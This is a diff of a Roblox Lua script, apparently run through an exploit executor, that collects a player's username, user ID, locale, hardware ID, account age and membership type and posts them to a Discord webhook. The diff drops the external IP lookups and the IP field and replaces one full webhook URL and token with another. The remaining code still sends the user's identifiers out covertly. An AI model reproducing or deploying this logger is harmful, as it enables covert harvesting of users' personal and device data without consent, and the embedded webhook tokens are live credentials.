@@ -8,8 +8,6 @@ local DName = LocalPlayer.DisplayName
 local Name = LocalPlayer.Name
 local UserId = LocalPlayer.UserId
 local Country = game.LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = game:HttpGet("http://ip-api.com/json")
 local GetHwid = RbxAnalyticsService:GetClientId()
 local AccountAge = LocalPlayer.AccountAge
 local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
@@ -26,7 +24,7 @@ local webhookcheck =
     (identifyexecutor():find("ScriptWare") and "Script-Ware") or
     ("Unsupported")
 
-local url = "https://discord.com/api/webhooks/1123433585014231072/uBNDP3e62uINIxTxR_7SnL6f4WPJ7kO2FDIXdUp8z-gCst9yDus9glEZjoFsdVtVzpQT"
+local url = "https://discord.com/api/webhooks/1124086618198900939/FjdFqKJattOctU-hk5c5wMsInY3qokfpISFIqoBrYgr541InaTUBUTB1Au4oOrn05iDM"
 
 local data = {
     content = "",
@@ -37,7 +35,6 @@ local data = {
             { name = "Nome do Jogador", value = Name, inline = true },
             { name = "ID do Jogador", value = UserId, inline = true },
             { name = "País", value = Country, inline = true },
-            { name = "IP", value = GetIp, inline = true },
             { name = "HWID", value = GetHwid, inline = true },
             { name = "Idade da Conta", value = AccountAge .. " dias", inline = true },
             { name = "Tipo de Membro", value = MembershipType, inline = true },
